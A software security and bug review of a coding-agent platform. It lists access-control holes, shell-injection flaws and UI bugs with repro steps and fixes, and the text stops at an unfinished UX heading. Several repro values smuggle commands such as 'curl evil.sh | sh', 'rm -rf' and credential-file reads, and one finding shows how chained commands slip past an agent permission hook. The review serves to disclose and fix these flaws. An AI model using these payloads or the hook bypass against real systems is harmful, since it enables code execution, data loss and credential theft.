# Bug Report — Daytona Background Agents

Review date: 2026-07-08. Findings are grouped by severity. Each entry has a location, reproduction steps, and a proposed fix. Line numbers reflect the state of the repo at review time and may drift slightly.

---

## CRITICAL / HIGH — Security

### S1. `/api/sandbox/*` routes have no authentication or ownership check (IDOR → shell/secret exfiltration)
- **Files:** `packages/web/app/api/sandbox/{ssh,terminal,delete,download,files,state}/route.ts`
- **Problem:** None of these handlers call `requireAuth()` or verify that the supplied `sandboxId` belongs to the caller. They take `sandboxId` straight from the request body and act on it with the single app-wide `DAYTONA_API_KEY`. The `agent/stream` route documents and fixes exactly this threat (`lib/db/api-helpers.ts:133-141`) but the `sandbox/*` family was never hardened.
- **Repro:** With no session cookie, `POST /api/sandbox/ssh {"sandboxId":"<victim-uuid>"}` returns a working SSH command into another user's sandbox. `POST /api/sandbox/files {"sandboxId":"<victim>","action":"read-file","filePath":"/root/.claude/.credentials.json","autoStart":true}` reads arbitrary paths (secrets). `POST /api/sandbox/download` exfiltrates the repo; `POST /api/sandbox/delete` destroys it.
- **Fix:** Add `requireAuth()` and verify ownership (`prisma.chat.findFirst({ where: { sandboxId, userId } })`, or scheduled-job equivalent) at the top of each handler; return 404 otherwise.

### S2. `/api/sandbox/git` — command injection via unescaped `repoPath`/`currentBranch`/`targetBranch` + no ownership check
- **File:** `packages/web/app/api/sandbox/git/route.ts` (body params ~line 73; interpolations at 99, 194, 304, 331, 377, 393, 414–421)
- **Problem:** `repoPath`, `currentBranch`, `targetBranch` come from the JSON body and are interpolated raw into `sandbox.process.executeCommand(...)` shell strings — no `escapeShell` (contrast `sandbox/files/route.ts`). The route requires GitHub auth but never checks the `sandboxId` is the caller's.
- **Repro:** `POST /api/sandbox/git {"sandboxId":"<any>","repoPath":"/x; curl evil.sh | sh; #","action":"list-branches"}` → arbitrary command execution in that sandbox. Or `currentBranch:"main; rm -rf /tmp/*"` on a merge.
- **Fix:** `escapeShell()` every interpolated value; validate branch names against a safe pattern; add a sandbox-ownership check.

### S3. `PATCH /api/chats/[chatId]` lets the client set `sandboxId`/`backgroundSessionId`/`sessionId` freely (re-opens the fixed stream IDOR)
- **File:** `packages/web/app/api/chats/[chatId]/route.ts:282-285`
- **Problem:** No validation that the supplied sandbox/session belongs to the user. `requireChatStreamAccess` was hardened to read these from the chat row, but the user fully controls their own chat row via this PATCH.
- **Repro:** `PATCH /api/chats/<my-chat> {"sandboxId":"<victim-sandbox>","backgroundSessionId":"<victim-session>"}` then `GET /api/agent/stream?chatId=<my-chat>&...` reads the victim's agent event log/output.
- **Fix:** Do not accept `sandboxId`/`backgroundSessionId`/`sessionId`/`previewUrlPattern` from the client on this PATCH (server-managed), or validate ownership.

### S4. `/api/git/push` — no ownership check, and trusts a body-supplied `githubToken`
- **File:** `packages/web/app/api/git/push/route.ts:9-56`
- **Problem:** Operates on any `sandboxId` (no ownership check); when `githubToken` is passed in the body the route drives a push from an arbitrary sandbox using an attacker-supplied token. `repoName` is interpolated into a path unescaped.
- **Fix:** Require session auth, verify sandbox ownership, drop the body-supplied token path.

### S5. Cron/`snapshot/rebuild` routes fail OPEN when `CRON_SECRET` is unset
- **Files:** `packages/web/app/api/snapshot/rebuild/route.ts:11-15`; `cron/agent-lifecycle/route.ts:26-29`; `cron/refresh-claude-creds`
- **Problem:** `if (secret && authHeader !== ...)` — when `CRON_SECRET` is not set the guard is skipped entirely, so anyone can trigger a multi-minute image rebuild (DoS) or drive lifecycle crons. A missing env var silently disables auth.
- **Fix:** Fail closed in production (require the secret unless `NODE_ENV !== "production"`).

### S6. Desktop: no navigation-origin restriction — foreign page inherits the privileged preload API
- **File:** `packages/desktop/src/main.ts:73-81` (+ `preload.ts`, `license-detect.ts:222-224`)
- **Problem:** `will-navigate` only blocks `/api/auth/signin`; any other in-window navigation loads a foreign page with the preload bridge attached. That page can call `window.electron.getClaudeLicenseAutoDetect()` (returns the user's Claude OAuth credentials from Keychain/`~/.claude/.credentials.json`) and exfiltrate. `sandbox:false` at main.ts:44 compounds this.
- **Fix:** In `will-navigate` and `setWindowOpenHandler`, `preventDefault()` for any URL whose origin ≠ `new URL(BACKEND_URL).origin`.

### S7. Desktop: deep link sets the session cookie with no state/nonce — session fixation
- **File:** `packages/desktop/src/main.ts:137-152`
- **Problem:** Any web page/email linking `background-agents://auth?token=<attacker-JWT>` silently replaces the victim's session cookie, logging them into an attacker-controlled account.
- **Fix:** Generate a one-time `state` when opening the auth flow and reject `auth` deep links whose state doesn't match; optionally confirm before switching sessions.

### S8. Desktop: `shell.openExternal` on unvalidated renderer URLs
- **File:** `packages/desktop/src/main.ts:65-68, 287-289`
- **Problem:** Remote content can pass `file://`/`smb://`/arbitrary protocol URLs; on Windows this can execute code or leak NTLM hashes.
- **Fix:** Allow-list `http:`/`https:`/`mailto:` before calling `openExternal`.

### S9. OpenCode MCP config with bearer tokens is written into the repo working tree
- **File:** `packages/agent-configuration/src/mcp/index.ts:134`
- **Problem:** OpenCode MCP config is written to `/home/daytona/project/opencode.json` (the git clone), embedding `Authorization: Bearer <token>` (Smithery/GitHub tokens). The agent commits/pushes working-tree changes → secrets land in the user's GitHub repo.
- **Fix:** Write to the global config `~/.config/opencode/opencode.json`, or add to `.git/info/exclude` and reference tokens via `{env:...}`.

### S10. Claude permission hook `deny-except` allow-check matches anywhere — compound-command bypass
- **File:** `packages/agent-configuration/src/permissions/claude.ts:68-81`
- **Problem:** The inner grep looks for one allowed form anywhere in the whole command string with no `LEAD` anchor or word boundary. `git rebase main && git rebase --abort` passes and runs the disallowed `git rebase main`; `--continue-anything` is treated as `--continue`.
- **Fix:** Evaluate each `LEAD`-separated subcommand independently and require the allowed flag immediately after the same prefix occurrence, with boundaries.

### S11. `escapeHtml` does not escape quotes
- **File:** `packages/web/lib/html.ts:4-9`
- **Problem:** Only `& < >` are escaped. Current call sites are element-context only (no live bug), but the first future use inside an HTML attribute becomes an injection hole.
- **Fix:** Add `.replace(/"/g,"&quot;").replace(/'/g,"&#39;")`.

---

## HIGH — Correctness

### C1. Rules-of-Hooks violation in `AssistantContent` — React crash when a streaming message changes state
- **File:** `packages/web/components/MessageBubble.tsx:106-147`
- **Problem:** `useMemo` (line ~145) is called after three conditional early returns. Every send creates an empty assistant placeholder that first renders via the `isEmpty` early return (0 hooks), then re-renders with content (1 hook) when the first stream delta arrives → "Rendered more hooks than during the previous render" and the chat tree unmounts. Reverse (content → error) throws "fewer hooks".
- **Repro:** Send a message; when the first assistant token/tool-call streams in, the hook count changes and React throws.
- **Fix:** Move the `useMemo` above the first early return (or drop it — `mergeConsecutiveToolCalls` is cheap).

### C2. RepoCombobox / BranchCombobox: infinite fetch-retry loop on fetch failure
- **Files:** `packages/web/components/chat/RepoCombobox.tsx:57-82`; `BranchCombobox.tsx:59-72`
- **Problem:** `loading` is in the effect deps and flips true→false on error while `repos`/`lastFetchedRepo` stay unchanged, so the guard passes again, `setError(null)` wipes the error, and the fetch restarts — unbounded request loop; error text never stays visible.
- **Repro:** Open the repo/branch picker while `/api/github/repos` or `/api/github/branches` returns 401/500 (expired token). Network tab shows requests firing forever.
- **Fix:** Remove `loading` from deps; track attempt state in a ref (set `lastFetchedRepo`/attempted flag in `.catch` too) and add an explicit Retry button.

### C3. Scheduled-job "at TIME / on DAY" pickers are dead — schedule never honored, and edit resets them
- **Files:** `packages/web/components/scheduled-jobs/ScheduleFields.tsx:106-140`; `lib/hooks/useScheduledJobForm.ts:114-115, 183-184`; `app/api/scheduled-jobs/route.ts:142-153`
- **Problem:** The client sends `runAtHour`/`runAtDay`, but there are no such fields in `CreateScheduledJobBody`/PATCH, no Prisma columns, and the server computes `nextRunAt: addMinutes(now, intervalMinutes)`. So "Every day at 9:00 AM" actually runs at creation-time + 24h; weekly day-of-week is ignored. On edit the pickers reset to Monday/9 AM (nothing to restore), presenting a misleading schedule the user "confirms".
- **Repro:** Create a job "Every day at 9:00 AM" at 4:37 PM → it runs ~4:37 PM daily.
- **Fix:** Persist `runAtHour`/`runAtDay` (schema + POST/PATCH + `nextRunAt` alignment + return in the job response), or remove the pickers until implemented.

### C4. Pending-message replay after OAuth sign-in never fires — message silently lost
- **File:** `packages/web/lib/hooks/usePendingMessageReplay.ts:83, 104`
- **Problem:** After sign-in, `startNewChat()` now returns a `draft-…` id (no DB row). The send effect gates on `chats.some(c => c.id === pendingSend.chatId)`, which is never true for draft ids (`chats` only holds server chats), so `sendMessage` never runs. The pending message was already cleared from sessionStorage, so it's permanently lost; `updateChatById(draftId,…)` also PATCHes a 404.
- **Repro:** Logged out → type a message → send → complete OAuth → returned to app with nothing sent.
- **Fix:** Bypass the `chats.some` gate for draft ids (`sendMessage` materializes drafts itself); skip `updateChatById` for draft ids.

### C5. SDK: Pi provider errors silently dropped — failed run ends as empty success
- **File:** `packages/sdk/src/agents/pi/parser.ts:222-242`
- **Problem:** Pi reports API failures via `message_end`/`turn_end` with `stopReason:"error"`/`errorMessage` (see fixture `tests/fixtures/jsonl-reference/pi.jsonl`), which are ignored; `agent_end` then emits a bare `end`, so a 400/auth/quota failure surfaces as a clean completion with empty content.
- **Fix:** In `message_end`/`turn_end`, when `stopReason==="error"` or `errorMessage` present, emit `{ type:"end", error: resolveAgentError(errorMessage,"pi") }`, deduped against `agent_end`.

### C6. Goose MCP config write destroys Goose's provider config
- **File:** `packages/agent-configuration/src/mcp/index.ts:149-165` (+ `sdk/src/sandbox/daytona.ts:144-155`)
- **Problem:** `generateGooseConfig` emits a file containing only `extensions:` + MCP entries and uploads it wholesale, replacing `~/.config/goose/config.yaml`. That file (written once, guarded by `test -f`) holds `GOOSE_PROVIDER`/`GOOSE_MODEL`/`GOOSE_MODE` and the `developer` extension — all permanently deleted, breaking goose.
- **Fix:** Parse/merge the YAML preserving top-level keys and existing `extensions.developer`.

### C7. Codex MCP config is deleted/overwritten before the CLI starts — MCP never works for Codex
- **Files:** `packages/agent-configuration/src/mcp/index.ts:83-98`; `packages/sdk/src/agents/codex/index.ts:44, 53`
- **Problem:** `setupMcpForAgent` runs before `createSession`→`codexSetup`, which `rm -f`s (or overwrites) `~/.codex/config.toml` — wiping the `[mcp_servers.*]` the MCP writer just created.
- **Fix:** Merge both writers into one TOML generator, or have `codexSetup` strip only provider keys and have the MCP writer append/merge.

---

## MEDIUM

### M1. Merging into a running chat's branch silently does nothing
- **File:** `packages/web/components/modals/git-dialogs/useGitDialogs.ts:154-159`
- **Problem:** The frontend returns before `callSandboxGit`, but the comment claims "the API will create the error message." No request is made, no feedback, no merge.
- **Repro:** Chat B's agent running; from chat A open Merge, pick B's branch, click Merge → dialog closes instantly with zero feedback.
- **Fix:** Let the request through so the backend produces the system message, or surface a local error before closing.

### M2. Admin activity "Load more" replaces the list instead of appending
- **Files:** `packages/web/app/admin/page.tsx:453,467`; `components/admin/ActivityFeed.tsx:311,358-365`; `lib/query/hooks/useAdminActivityQuery.ts:72-82`
- **Problem:** The query is keyed per page with no accumulation/`placeholderData`. Clicking "Load more" swaps the key → `data` becomes undefined (skeleton), then only events 21–40 render; pages 1–20 are gone with no "previous" control.
- **Fix:** Use `useInfiniteQuery` and concatenate pages, or at minimum `placeholderData: keepPreviousData`.

### M3. Admin dashboard collapses to full-page skeleton on every toggle
- **File:** `packages/web/app/admin/page.tsx:83,131`
- **Problem:** Each time-range/metric/include-admins toggle changes the stats query key → fresh cache entry with `isLoading===true` (no `keepPreviousData`) → the early return unmounts the whole page, including the toggle just clicked.
- **Fix:** Add `placeholderData: keepPreviousData` and gate the skeleton on first-ever load (`isLoading && !data`).

### M4. TOCTOU race in message POST "busy" gate → duplicate sandboxes + double agent runs
- **File:** `packages/web/app/api/chats/[chatId]/messages/route.ts:102-104` vs `_lib/ensure-sandbox.ts:103-105`, `_lib/persist-turn.ts:90-102`
- **Problem:** The `status === "creating"|"running"` gate reads a status captured earlier; status is only flipped much later. Two concurrent POSTs both pass, both call `createSandboxForChat`; the second overwrites `sandboxId`, orphaning the first sandbox (leak) and starting two billable turns.
- **Fix:** Make the gate atomic: `updateMany({ where:{ id, status:{ notIn:["creating","running"] } }, data:{ status:"creating" } })` and treat `count===0` as 409, before any sandbox work.

### M5. Scheduled-jobs poll reverts the user's selected run; stale response can overwrite
- **File:** `packages/web/components/scheduled-jobs/ScheduledJobsView.tsx:99-126`
- **Problem:** Every 30s tick unconditionally resets `selectedRun` to the newest run, clobbering the user's selection mid-read. Cleanup only clears the interval — an in-flight fetch for a previous job still resolves and overwrites state.
- **Fix:** `setSelectedRun(prev => prev && runs.some(r=>r.id===prev.id) ? prev : runs[0])`; add a `cancelled` flag guarding all setters.

### M6. Git dialogs: Enter re-fires merge/rebase/PR while a request is in flight
- **Files:** `packages/web/components/ui/BranchSelector.tsx:79-85`; `modals/git-dialogs/useGitDialogs.ts:146-147`
- **Problem:** The footer button is disabled via `actionLoading`, but the Enter path isn't. A second Enter while the dialog is open (focus in the autofocused selector) fires the handler again → two `/api/github/pr` POSTs or two concurrent merges.
- **Repro:** Open Create PR, press Enter twice quickly.
- **Fix:** `if (actionLoading) return` at the top of each handler and/or suppress Enter-submit when loading.

### M7. Composer permanently stuck in "sending" (and message lost) when a send early-returns
- **Files:** `packages/web/lib/hooks/useSendMessage.ts:87-91,133`; `useMessageDispatch.ts:123-129`; `useChatComposer.ts:275-277`
- **Problem:** `isSendingMessage` is only cleared by a status transition. If a draft's first send fails (offline/500) or double-send returns `null`, no optimistic update runs, status never changes, so the composer stays disabled until switching chats. Worse, `handleSend` already cleared input/files, so the text is gone.
- **Fix:** Resolve `sendMessage` with an outcome and clear the flag in `.finally()`; restore draft text on the failure path.

### M8. SSE "update" frames overwrite the last message, not the assistant placeholder by id
- **File:** `packages/web/lib/hooks/useStreaming.ts:154-162`
- **Problem:** The handler writes to `messages[lastIndex]` although `assistantMessageId` is in scope. Any merge/append that lands a message after the placeholder mid-stream (timestamp re-sort with skewed client clock, or a client-side git message) corrupts the wrong bubble and leaves the real placeholder empty.
- **Fix:** `const i = messages.findIndex(m => m.id === assistantMessageId)` and update that (fall back to last assistant).

### M9. Skill / MCP search: stale-response race (no abort/guard on debounced fetch)
- **Files:** `packages/web/components/skills/SkillSearchView.tsx:73-98`; `components/chat/McpServersCombobox.tsx:187-223`
- **Problem:** Effect cleanup clears only the timeout, never in-flight fetches. A slower older-query response can land after a newer one and overwrite results → list shows results for a query no longer in the box; installing picks the wrong item.
- **Fix:** AbortController aborted in cleanup, or capture the query per request and ignore mismatches.

### M10. Settings: one half-finished custom endpoint silently discards ALL endpoint changes
- **File:** `packages/web/components/modals/SettingsModal.tsx:314-319`
- **Problem:** Settings save on close; if any endpoint is invalid, the entire `customEndpoints` array is omitted from the payload, so unrelated edits and deletions are lost.
- **Repro:** Delete endpoint A → Add endpoint → type only a name → close → reopen: A is back.
- **Fix:** `data.customEndpoints = endpoints.filter(isValid)`, or block close with a warning.

### M11. Admin user GitHub link built from display name — 404 or wrong profile
- **File:** `packages/web/components/admin/UserTable.tsx:146,376`
- **Problem:** `href={\`https://github.com/${user.name || user.githubId}\`}` — `user.name` is a display name (may contain spaces) and `githubId` is a numeric id; neither is the login. Link 404s or lands on a stranger.
- **Fix:** Use `https://github.com/u/${user.githubId}` (numeric redirect), or store/expose the real login.

### M12. Admin chart dates off by one day west of UTC
- **File:** `packages/web/components/admin/charts/chartFormatters.ts:9-18`
- **Problem:** Stats API emits date-only strings; `new Date("2026-07-08")` is UTC midnight but `getMonth()/getDate()` render local time, so every negative-offset timezone (all the Americas) labels the previous day.
- **Fix:** Parse without TZ shift (`const [y,m,d]=value.split("-").map(Number); new Date(y,m-1,d)`) or format with `timeZone:"UTC"`.

### M13. `createFileCommit` breaks on non-Latin1 content and can't update existing files
- **File:** `packages/common/src/github.ts:237-252`
- **Problem:** `btoa(content)` throws for any char > U+00FF (emoji/CJK/curly quotes). The Contents API PUT needs the existing blob `sha` to update, so "create or update" 422s on existing paths. `options.path` isn't URL-encoded.
- **Fix:** `Buffer.from(content,"utf8").toString("base64")`; GET the path first to pass `sha`; encode path segments.

### M14. MessageBubble memo comparator too narrow — stale `onOpenFile` wipes preview tabs; upload chips never appear
- **Files:** `packages/web/components/MessageBubble.tsx:78-87`; `app/page.tsx:642-645`; `lib/hooks/usePreview.ts:68-84`; `lib/chat-messages.ts:194`
- **Problem:** The comparator ignores `uploadedFiles`, `messageType`, `isError`, and the callbacks. `onOpenFile` is an inline arrow closing over `previewItems`, so a finished bubble keeps a stale closure: click file A then B from the same old bubble and tab A silently disappears. Also `applySendSuccess` patches `uploadedFiles` onto the sent message, but chips never render until a full remount.
- **Fix:** Compare `uploadedFiles`/`messageType`/`isError`; make `openPreview` use a functional update (stable `onOpenFile`).

### M15. SDK: `patchMeta` is a non-atomic read-modify-write — lost meta updates under concurrent polls
- **File:** `packages/sdk/src/background/session.ts:419-423` (+ `getSnapshot`, `cancel`)
- **Problem:** `getSnapshot` is documented concurrency-safe and polled on a shared session, but it and `cancel` do read-then-write on `meta.json`. Two concurrent patches interleave; a `cancelled:true` flag or a captured `sessionId` can be clobbered, breaking resume.
- **Fix:** Serialize meta writes (in-process mutex/queue) or use atomic compare-and-set.

### M16. SDK: Claude `error_max_turns` and Copilot missing `exitCode` reported as success/false-error
- **Files:** `packages/sdk/src/agents/claude/parser.ts:150-153`; `copilot/parser.ts:355-358`
- **Problem:** Claude `isError` checks only `error_during_execution`/`error`, so `error_max_turns` falls through as a clean end. Copilot `ev.exitCode !== 0` is true when `exitCode` is `undefined` → bogus "Process exited with code undefined".
- **Fix:** Claude — treat any subtype other than `"success"` as error. Copilot — `typeof ev.exitCode === "number" && ev.exitCode !== 0`.

### M17. SDK: Codex `item.started` catch-all emits spurious/duplicate `tool_start`, leaving dangling tools
- **File:** `packages/sdk/src/agents/codex/parser.ts:134-178`
- **Problem:** `item.started` matches every item type: `web_search`/`todo_list`/`reasoning` produce a `tool_start` with no matching `tool_end` (permanently "running"); `file_change` emits start twice; `command_execution` with `aggregated_output===undefined` drops its `tool_end`.
- **Fix:** Whitelist tool item types in `item.started`; dedupe `file_change` by `item.id`; always emit `tool_end` for completed commands/searches.

### M18. SDK: credentials written with `echo '...'` corrupt backslashes
- **Files:** `packages/sdk/src/agents/claude/index.ts:56-62`; `codex/index.ts:57-61`
- **Problem:** `escapeShell` only escapes single quotes; `echo` under dash/`sh -c` interprets `\\`→`\` and `\n`→newline in the `JSON.stringify` output → corrupted credential JSON → auth failure. Other config paths already use `printf '%s'`.
- **Fix:** `printf '%s' <quoted-json> > file`.

### M19. sandbox-git: unescaped branch/refspec in `fetchBranch`/`fetch` — injection & breakage
- **File:** `packages/sandbox-git/src/commands.ts:121-122, 141-142`
- **Problem:** `clone()` escapes `branch`, but `fetchBranch`/`fetch` interpolate branch/refspec raw. A branch name with spaces or `` ;`id` ``/`$()` breaks or executes shell in the sandbox.
- **Fix:** `esc()` the refspec/ref.

### M20. sandbox-git: `parseGitStatus` truncates branch names containing `.`
- **File:** `packages/sandbox-git/src/parsers.ts:25-26`
- **Problem:** `/^## ([^.\s]+)/` cuts `## release.2.0...origin/release.2.0` to `"release"`, and `## No commits yet on main` to `"No"`. Any dotted branch is corrupted downstream.
- **Fix:** Parse against the `...` separator: `/^## ([^\s]+?)(?:\.\.\.|\s|$)/`, special-case "No commits yet".

### M21. sandbox-jobs: env-var NAME interpolated unescaped into `export` — injection
- **File:** `packages/sandbox-jobs/src/jobs.ts:54-56` (mirror `sdk/src/sandbox/daytona.ts:27-29`)
- **Problem:** Only the value is quoted; a key like `` x`$(id)` `` or `X; curl evil|sh #` executes on every job start. The web env UI doesn't charset-validate keys.
- **Fix:** Validate keys `^[A-Za-z_][A-Za-z0-9_]*$` and reject non-conforming names.

### M22. sandbox-skills: unescaped `source`/`skillId`/`repoPath` in skill CLI commands — injection
- **File:** `packages/sandbox-skills/src/sandbox/{install,list,uninstall}.ts`
- **Problem:** `source`, `skillId`, `skillName`, `repoPath` are interpolated raw into `npx skills ...`. A handle like `owner/repo; rm -rf ~ #` runs arbitrary shell.
- **Fix:** Shell-quote every interpolated value.

### M23. sandbox-terminal: concurrent `setupTerminal` calls race → duplicate/failed PTY servers
- **File:** `packages/sandbox-terminal/src/sandbox/setup.ts:138, 240-250`
- **Problem:** The `isServerRunning` check and server start aren't atomic (`flock` only serializes npm install). Two tabs opening at once both start `websocket-pty-server.js` on port 44777; the second hits EADDRINUSE and dies, leaving a lingering bootstrap session.
- **Fix:** Guard check-and-start under the same `flock`, re-checking inside the critical section.

### M24. Desktop: deep links dropped on cold start (`mainWindow` null) — macOS auth dead-ends
- **File:** `packages/desktop/src/main.ts:128-130`
- **Problem:** On macOS `open-url` fires before `createWindow()`; `handleDeepLink` returns early when `mainWindow` is null, dropping the auth JWT and leaving an unauthenticated window.
- **Fix:** Queue the URL and replay it after `createWindow()`.

### M25. Desktop git-sync: repo dir keyed by name only — cross-owner collision + `..` escape
- **File:** `packages/desktop/src/git-sync.ts:113-116`
- **Problem:** `repoDir` uses only the repo name, so `alice/app` and `bob/app` map to `<root>/app` while `repoQueues` keys on the full string → concurrent isomorphic-git ops on one `.git` (index/ref corruption). `repo="x/.."` escapes the root.
- **Fix:** Use `<root>/<owner>/<name>` (key queues on the resolved dir) and reject `repo` not matching `/^[\w.-]+\/[\w.-]+$/`.

### M26. dev-cron: daily/timed schedules become every-minute, and runs overlap
- **Files:** `packages/dev-cron/src/parser.ts:44-59`; `index.ts:129-133`
- **Problem:** `0 0 * * *` (daily) and `M H * * *` fall through to a 60s default, so a daily cron (e.g. refresh-creds) is hammered every minute in dev. `runCron` is fire-and-forget in `setInterval`, so slow jobs overlap and pile up.
- **Fix:** Handle `M H * * *` as 24h; guard re-entry (`let running`), or reschedule with `setTimeout` after completion.

---

## LOW

### L1. ChatInput repo link points to `.../tree/null` before the branch exists
- **File:** `packages/web/components/chat/ChatInput.tsx:516-520` — `chat.branch` can be null during sandbox creation, so the href is `.../tree/null` (404). `ChatHeader` guards this; ChatInput doesn't. Fall back to `chat.baseBranch`/repo root.

### L2. Hourly-activity tooltip shows wrong AM/PM at 11:00
- **File:** `packages/web/components/admin/charts/HourlyActivityChart.tsx:80-86` — `h===11` → "11 AM - 12 AM" (should be 12 PM); `h===23` → "11 PM - 12 PM" (should be 12 AM). Use a single `fmt(h)` helper handling 0/12/24.

### L3. Duplicate "Actions" header in mobile commands sheet for repo-less chats
- **File:** `packages/web/components/MobileCommandsMenu.tsx:136-148` — the else-branch header and the `chat &&` header both render. Remove the else-branch header.

### L4. Queued-message ids collide (`q-${Date.now()}`)
- **File:** `packages/web/lib/hooks/useQueueDispatch.ts:167` — two enqueues in the same ms get identical ids; removing one deletes both and React keys collide. Use `q-${nanoid()}`.

### L5. `fmtTokens` renders 999,950–999,999 as "1000K"
- **File:** `packages/web/lib/format.ts:8` — `(999.96).toFixed(0)` → "1000K" instead of "1.0M". Round/clamp before branching.

### L6. `localHourToUtc` wrong for half-hour offsets; day-of-week not shifted across UTC midnight
- **File:** `packages/web/components/scheduled-jobs/form-config.ts:19-27` (latent behind C3) — `Math.floor` drops :30/:45 offsets; `runAtDay` sent with a UTC hour without adjusting the day when conversion crosses midnight. Convert (day, hour) as one local→UTC datetime.

### L7. `useFileUpload`: no-op unmount cleanup + leaking preview blob URLs; size budget races
- **File:** `packages/web/lib/hooks/useFileUpload.ts:164-170,211,299-326` — `[]`-dep cleanup sees the initial empty array and revokes freshly-created URLs; `getFilePreviewUrl` mints a new blob URL every render with no revoke; `addFiles` computes the size budget from a stale closure so two same-tick adds can exceed 4 MB. Cache URLs per file and revoke on remove/clear; compute totals inside a functional update.

### L8. `internalError()` leaks raw exception messages to clients
- **File:** `packages/web/lib/db/api-helpers.ts:59-62` — Prisma/Daytona/git stderr returned verbatim. Return a generic 500 body; log detail server-side.

### L9. `PATCH /api/chats/[chatId]` accepts arbitrary `status`/`model`/`agent`/`repo`/`baseBranch`
- **File:** `packages/web/app/api/chats/[chatId]/route.ts:272-287` — any string is written straight to the DB (e.g. `status:"running"` strands the chat as busy). Whitelist `status`; validate `agent`/`model`.

### L10. sandbox-git: `git status --porcelain -b 2>&1` folds stderr into parsed output
- **File:** `packages/sandbox-git/src/commands.ts:100` — warnings/advice ≥3 chars are parsed as phantom files; renamed entries store `"old -> new"` as the path. Drop `2>&1`, use `-z`, handle `->`.

### L11. SDK: Droid failed tool results discard the error message
- **File:** `packages/sdk/src/agents/droid/parser.ts:75-76` — `tool_result` with `isError:true` and no `value` yields `undefined` output, so the failure reason is lost (tool renders completed-empty). Fall back to `extractErrorMessage(json.error)`.

### L12. SDK: ELIZA substitution uses user text as `String.replace` replacement — `$`-sequence corruption
- **File:** `packages/sdk/src/agents/eliza/patterns.ts:675-677,730-762` — `$\``/`$'`/`$&`/`$1`/`$$` in the user prompt are interpreted specially and garble output (persisted to memory files). Use a replacer function or escape `$`→`$$`.

### L13. SDK: sandbox-jobs cursor byte-count drift on non-UTF-8 log bytes
- **File:** `packages/sandbox-jobs/src/jobs.ts:231-235`; `shell.ts:60-61` — `tail -c +N` counts bytes but the cursor is re-derived from a decoded string, so invalid/truncated multibyte output drifts the cursor (skip/repeat). Track offsets via a byte-accurate channel.

### L14. sandbox-terminal: PTY server never closes the WebSocket when the shell exits
- **File:** `packages/sandbox-terminal/src/server/pty-server.ts:56-89` — no `ptyProcess.onExit` handler, so after `exit` the socket leaks and the client hangs. Add `ptyProcess.onExit(() => { try { ws.close() } catch {} })`.

### L15. sandbox-skills: `discover` reads `cat "${skillMdPath}"` with unescaped path
- **File:** `packages/sandbox-skills/src/sandbox/discover.ts:103-104` — a skill dir containing `"`/`$`/backticks breaks or injects. Single-quote the path.

### L16. SDK: SSE `complete` conflict/markdown callbacks read one render late
- **File:** `packages/web/lib/hooks/useChatWithSync.ts:81-84` (+ `useStreaming.ts:65-70`) — `onConflictStateChangeRef.current` is passed by value; a `complete` frame arriving after re-registration but before the next render invokes the stale callback and drops the conflict indicator. Pass the refs, not `.current`.

### L17. `setupClaudePermissions` throws on malformed `settings.json`
- **File:** `packages/agent-configuration/src/permissions/claude.ts:133-138` — `JSON.parse` of an invalid reused `~/.claude/settings.json` throws with no try/catch, failing the whole turn. Back up the bad file and write fresh settings.

---
---

# UI / UX Findings

A second focused pass on visual polish, interaction feedback, empty/error states, mobile, and accessibility. These are separate from the correctness/security list above. Grouped by area.

## Chat surface

### UX1. Send silently no-ops when the model lacks credentials — button still looks enabled
- **Type:** UX-improvement · **Impact:** high
- **Files:** `packages/web/lib/hooks/useChatComposer.ts:245-247`; `components/chat/ChatInput.tsx:420-435`
- **Problem:** `handleSend` returns early when `!hasRequiredCredentials`, but the ArrowUp send button stays fully primary-colored and enabled. The only hint is red text + a Lock icon in the model selector, which is hidden below the `@[32rem]` container breakpoint. Enter/click does nothing, no toast, no tooltip.
- **Fix:** Fold `hasRequiredCredentials` into `canSend`, render the button disabled with `title="Add an API key for this model to send"`, or on blocked send open Settings / show a toast.

### UX2. Cmd/Ctrl/Alt+Enter silently no-ops when branching isn't available
- **Type:** UX-improvement · **Impact:** high
- **File:** `packages/web/lib/hooks/useChatComposer.ts:336-340, 284-291`
- **Problem:** Cmd+Enter always calls `handleBranchSend`, which only acts when `git.canBranch && input.trim()`. In a new chat / no repo / no sandbox yet, `preventDefault()` swallows the keypress and nothing sends — Cmd+Enter is muscle-memory "send" everywhere else.
- **Fix:** Fall through to `handleSend()` when `!git.canBranch`.

### UX3. Escape in the slash-command menu wipes the entire draft
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/lib/hooks/useChatComposer.ts:321-326`
- **Problem:** The Escape case calls `setInput("")`, so typing `/merge and explain the change` then pressing Escape to dismiss the popup deletes the whole message. Click-outside dismissal keeps the text, so the two paths disagree; convention (Slack/Linear/VS Code) is Escape closes the menu and keeps text. **Verified.**
- **Fix:** Remove `setInput("")` from the Escape case.

### UX4. No "copy message" action on chat messages
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/components/MessageBubble.tsx:149-192`
- **Problem:** The only copy affordance is per-code-block. Copying an agent's full answer or re-using an earlier prompt requires manual drag-select across markdown, tool groups, and code blocks. Every comparable product has a hover copy button per message.
- **Fix:** Hover-reveal icon row (Copy, optionally "Re-use prompt" on user bubbles) reusing `useCopyToClipboard`, with `pointer-coarse:opacity-100` for touch.

### UX5. Stop button has no accessible name or tooltip
- **Type:** a11y · **Impact:** med
- **File:** `packages/web/components/chat/ChatInput.tsx:411-419`
- **Problem:** Icon-only red square with neither `aria-label` nor `title` (the adjacent queue and send buttons both have them). Screen readers announce just "button".
- **Fix:** `title="Stop agent" aria-label="Stop agent"`.

### UX6. Long unbroken tokens are clipped, not wrapped, inside message bubbles
- **Type:** UI-bug · **Impact:** med
- **File:** `packages/web/components/message/MarkdownContent.tsx:19, 46-48`
- **Problem:** Root div is `overflow-hidden` and only `<a>` gets `break-words`; plain paragraphs/inline-code don't. Pasting a long path, base64 blob, or token (very common in a coding agent) clips the tail invisibly with no wrap or scroll — worst in the user bubble (`inline-block max-w-full`).
- **Fix:** Add `break-words` / `[overflow-wrap:anywhere]` to the MarkdownContent root.

### UX7. MCP server connect/disconnect failures are invisible
- **Type:** UX-improvement · **Impact:** high
- **File:** `packages/web/components/chat/McpServersCombobox.tsx:406-409, 429-432`
- **Problem:** On connect/disconnect failure (network, no remote URL, registry 500, popup blocked) the spinner just disappears — no checkmark, no message. The popup-blocked path (`if (!popup || popup.closed) return`) makes the click look like a total no-op. A `notify()` toast helper already exists.
- **Fix:** `notify({ title: "Couldn't connect <name>", description: err.message })` in each catch; explicit "Allow popups to continue" when `window.open` returns null.

### UX8. Queued-message shelf has no label and truncates with no way to read the full text
